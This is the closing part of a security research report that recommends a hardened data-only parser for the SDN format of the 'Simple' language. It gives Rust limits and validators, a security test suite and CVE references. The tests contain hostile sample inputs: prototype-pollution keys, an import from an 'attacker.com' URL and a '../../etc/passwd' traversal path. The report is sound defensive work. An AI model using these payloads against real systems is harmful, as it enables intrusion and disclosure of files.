    /// Maximum nesting depth for inline dicts/arrays
    pub max_nesting_depth: usize,  // Default: 100

    /// Maximum size of individual cell value
    pub max_cell_size: usize,  // Default: 1 MB

    /// Maximum total size of table
    pub max_table_size: usize,  // Default: 100 MB

    /// Maximum number of rows per table
    pub max_row_count: usize,  // Default: 100,000

    /// Maximum number of columns per table
    pub max_column_count: usize,  // Default: 1,000

    /// Allow external references (DISABLED for security)
    pub allow_external_refs: bool,  // Default: false

    /// Allow string interpolation (DISABLED for security)
    pub allow_interpolation: bool,  // Default: false
}

impl Default for SdnParserConfig {
    fn default() -> Self {
        Self {
            max_nesting_depth: 100,
            max_cell_size: 1_000_000,      // 1 MB
            max_table_size: 100_000_000,    // 100 MB
            max_row_count: 100_000,
            max_column_count: 1_000,
            allow_external_refs: false,     // SECURITY: No URLs/file paths
            allow_interpolation: false,     // SECURITY: No template expansion
        }
    }
}
```

---

### 6.2 Key Security Features to Implement

#### 1. Reject Reserved Field Names

```rust
const RESERVED_FIELD_NAMES: &[&str] = &[
    "__proto__",
    "constructor",
    "prototype",
    "__defineGetter__",
    "__defineSetter__",
    "__lookupGetter__",
    "__lookupSetter__",
];

fn validate_field_name(name: &str) -> Result<(), Error> {
    // Reject prototype pollution vectors
    if RESERVED_FIELD_NAMES.contains(&name) {
        return Err(Error::ReservedFieldName(name.to_string()));
    }

    // Reject path traversal in field names
    if name.contains("..") || name.contains("/") || name.contains("\\") {
        return Err(Error::InvalidFieldName(name.to_string()));
    }

    // Whitelist alphanumeric + underscore only
    if !name.chars().all(|c| c.is_alphanumeric() || c == '_') {
        return Err(Error::InvalidFieldName(name.to_string()));
    }

    Ok(())
}
```

---

#### 2. Enforce Nesting Depth Limits

```rust
fn parse_value(input: &str, depth: usize, config: &SdnParserConfig) -> Result<Value, Error> {
    if depth > config.max_nesting_depth {
        return Err(Error::NestingTooDeep {
            depth,
            max: config.max_nesting_depth,
        });
    }

    match parse_value_type(input)? {
        ValueType::Dict => parse_dict(input, depth + 1, config),
        ValueType::Array => parse_array(input, depth + 1, config),
        ValueType::Primitive => parse_primitive(input),
    }
}
```

---

#### 3. Size and Resource Limits

```rust
struct TableParser {
    total_bytes: usize,
    row_count: usize,
    config: SdnParserConfig,
}

impl TableParser {
    fn parse_cell(&self, value: &str) -> Result<Value, Error> {
        if value.len() > self.config.max_cell_size {
            return Err(Error::CellTooLarge {
                size: value.len(),
                max: self.config.max_cell_size,
            });
        }

        parse_value(value, 0, &self.config)
    }

    fn parse_row(&mut self, row: &[&str]) -> Result<Vec<Value>, Error> {
        // Check column count
        if row.len() > self.config.max_column_count {
            return Err(Error::TooManyColumns {
                count: row.len(),
                max: self.config.max_column_count,
            });
        }

        // Check row count
        self.row_count += 1;
        if self.row_count > self.config.max_row_count {
            return Err(Error::TooManyRows {
                count: self.row_count,
                max: self.config.max_row_count,
            });
        }

        // Track total size
        let row_size: usize = row.iter().map(|s| s.len()).sum();
        self.total_bytes += row_size;

        if self.total_bytes > self.config.max_table_size {
            return Err(Error::TableTooLarge {
                size: self.total_bytes,
                max: self.config.max_table_size,
            });
        }

        row.iter().map(|cell| self.parse_cell(cell)).collect()
    }
}
```

---

#### 4. No External References

```rust
fn parse_string(input: &str, config: &SdnParserConfig) -> Result<String, Error> {
    // SECURITY: Reject anything that looks like a URL or file path
    if !config.allow_external_refs {
        if input.starts_with("http://") || input.starts_with("https://") {
            return Err(Error::ExternalReferenceNotAllowed);
        }

        if input.starts_with("file://") || input.starts_with("/") {
            return Err(Error::FilePathNotAllowed);
        }
    }

    Ok(input.to_string())
}
```

---

#### 5. No String Interpolation

```rust
fn parse_string_value(input: &str, config: &SdnParserConfig) -> Result<String, Error> {
    // SECURITY: Reject template syntax
    if !config.allow_interpolation {
        if input.contains("${") || input.contains("#{") || input.contains("{{") {
            return Err(Error::InterpolationNotAllowed);
        }
    }

    Ok(input.to_string())
}
```

---

### 6.3 Testing Strategy

**Security Test Suite:**

```rust
#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_reject_proto_pollution() {
        let malicious = r#"
        users |id, __proto__, role|
            1, malicious, admin
        "#;

        let result = parse_sdn_table(malicious);
        assert!(matches!(result, Err(Error::ReservedFieldName(_))));
    }

    #[test]
    fn test_nesting_depth_limit() {
        let mut nested = "data: {".to_string();
        for _ in 0..200 {
            nested.push_str("x: {");
        }
        nested.push_str("value: 1");
        for _ in 0..200 {
            nested.push_str("}");
        }

        let result = parse_sdn(&nested);
        assert!(matches!(result, Err(Error::NestingTooDeep { .. })));
    }

    #[test]
    fn test_cell_size_limit() {
        let huge_value = "A".repeat(2_000_000);  // 2 MB
        let table = format!(r#"
        data |value|
            {}
        "#, huge_value);

        let result = parse_sdn_table(&table);
        assert!(matches!(result, Err(Error::CellTooLarge { .. })));
    }

    #[test]
    fn test_reject_external_urls() {
        let malicious = r#"
        config:
            import: "http://attacker.com/malicious.sdn"
        "#;

        let result = parse_sdn(malicious);
        assert!(matches!(result, Err(Error::ExternalReferenceNotAllowed)));
    }

    #[test]
    fn test_reject_path_traversal() {
        let malicious = r#"
        files |path|
            ../../etc/passwd
        "#;

        // NOTE: Parser allows the value, but application must validate
        // before using as file path
        let result = parse_sdn_table(malicious);
        assert!(result.is_ok());

        // Application-level validation should reject
        if let Ok(table) = result {
            for row in table.rows() {
                let path = &row[0];
                assert!(validate_safe_path(path).is_err());
            }
        }
    }
}
```

---

### 6.4 Documentation Requirements

**Security Warning in Parser Documentation:**

```rust
/// SDN Parser - Data-Only Mode
///
/// # Security
///
/// The SDN parser operates in **data-only mode** by default for security:
///
/// - **No code execution**: Only primitive types (bool, int, float, string, array, dict)
/// - **No external references**: URLs and file paths are rejected
/// - **No template expansion**: String interpolation is disabled
/// - **Resource limits**: Nesting depth, cell size, and table size are bounded
/// - **Field validation**: Reserved names and special characters are rejected
///
/// ## Threat Model
///
/// This parser is designed to safely handle **untrusted input** including:
/// - Configuration files from external sources
/// - User-uploaded data files
/// - Network-received SDN documents
/// - Developer machine configs (supply chain attack vector)
///
/// ## What This Prevents
///
/// - Deserialization RCE (like YAML CVE-2022-1471)
/// - Prototype pollution (like JSON prototype attacks)
/// - Template injection (like SSTI)
/// - DoS via entity expansion (like Billion Laughs)
/// - Path traversal in field names
/// - Memory exhaustion via unbounded nesting or cell sizes
///
/// ## Defense in Depth
///
/// Even with data-only parsing, applications should:
/// 1. Validate schema matches expected structure
/// 2. Sanitize/validate all values before use (especially file paths)
/// 3. Enforce application-level access controls
/// 4. Consider sandboxing for highly untrusted sources
///
/// ## Unsafe Operations
///
/// The following features are **intentionally not supported** for security:
/// - Object instantiation or method calls
/// - External entity resolution (URLs, file includes)
/// - String interpolation or template expansion
/// - Formula evaluation (CSV-style `=FORMULA()`)
/// - Access to language-level constructs (prototypes, classes)
///
/// If you need these features, implement them at the application layer
/// with appropriate security controls.
```

---

## 7. Conclusion

### Key Findings

1. **Data-only mode is a proven security pattern** recognized across industry:
   - PyYAML's `safe_load` vs `load`
   - JavaScript's `JSON.parse` vs `eval`
   - XML parsers with DTD processing disabled

2. **Separating data from operations prevents entire vulnerability classes:**
   - Deserialization RCE (CVE-2022-1471, CVE-2026-24009, CVE-2017-18342)
   - XXE attacks and SSRF
   - Prototype pollution (CVE-2022-42743, CVE-2021-3918)
   - Template injection
   - CSV formula injection
   - Configuration injection (CVE-2025-61260)

3. **Real-world attacks demonstrate critical impact:**
   - JBoss, Yahoo, Ruby on Rails: RCE from deserialization
   - Codex CLI: Supply chain attacks via config injection
   - Cloud metadata exfiltration via RCE
   - Data theft through XXE and template injection

4. **SDN-specific risks are manageable with proper controls:**
   - Field injection → validate field names, reject reserved keywords
   - Nesting DoS → enforce depth limits (100 levels default)
   - Memory exhaustion → size limits on cells (1 MB) and tables (100 MB)
   - Path traversal → reject `..`, `/`, `\` in keys, validate paths at application layer
   - No interpolation → prevent template injection entirely

### Recommended Implementation

**For Simple language SDN parser:**

1. **Default to data-only mode** with no opt-out
2. **Enforce all resource limits** described in section 6.2
3. **Reject reserved field names** to prevent prototype pollution
4. **Never add string interpolation** to SDN format
5. **Document security guarantees** clearly for users
6. **Comprehensive security test suite** covering all attack vectors

### Defense in Depth

Data-only parsing is the **first layer** of security, not the only layer:

```
Layer 1: Parser (data-only mode) ← Prevents RCE, injection, DoS
Layer 2: Schema validation       ← Ensures expected structure
Layer 3: Application validation  ← Business logic checks
Layer 4: Sandboxing             ← Isolates untrusted input
```

By implementing data-only mode, Simple's SDN parser will:
- Match industry security best practices
- Prevent critical CVEs that have affected major organizations
- Provide safe defaults for parsing untrusted input
- Enable developers to confidently use SDN for configuration without security concerns

---

## References

### CVEs and Vulnerabilities

- [CVE-2022-1471 - SnakeYAML Deserialization](https://www.greynoise.io/blog/cve-2022-1471-snakeyaml-deserialization-deep-dive)
- [CVE-2026-24009 - Docling-Core YAML RCE](https://dev.to/cverports/cve-2026-24009-yaml-deserialization-the-gift-that-keeps-on-giving-in-docling-core-1don)
- [CVE-2025-61260 - Codex CLI Command Injection](https://research.checkpoint.com/2025/openai-codex-cli-command-injection-vulnerability/)
- [CVE-2025-54803 - js-toml Prototype Pollution](https://github.com/advisories/GHSA-65fc-cr5f-v7r2)
- [CVE-2022-42743 - deep-parse-json Prototype Pollution](https://security.snyk.io/vuln/SNYK-JS-DEEPPARSEJSON-3104597)

### Security Guides

- [OWASP XML External Entity Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [PortSwigger Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [PortSwigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [NCSC Pattern: Safely Importing Data](https://www.ncsc.gov.uk/guidance/pattern-safely-importing-data)

### Best Practices

- [RealPython - YAML Safe Loading](https://realpython.com/python-yaml/)
- [PyYAML safe_load Documentation](https://thelinuxcode.com/yaml-safe-load/)
- [JSON Utils - JSON.parse Best Practices](https://jsonutils.online/en/blog/javascript-json-parse-deep-dive)
- [OpenStack - Avoid Dangerous Parsers](https://security.openstack.org/guidelines/dg_avoid-dangerous-input-parsing-libraries.html)

### Research Papers

- [Curing the Vulnerable Parser (USENIX)](https://www.usenix.org/system/files/login/articles/login_spring17_08_bratus.pdf)
- [DARPA SafeDocs Initiative](https://www.darpa.mil/research/programs/safe-documents)
- [ACM - Java Deserialization RCE Study](https://dl.acm.org/doi/10.1145/3554732)

---

**End of Security Research Report**
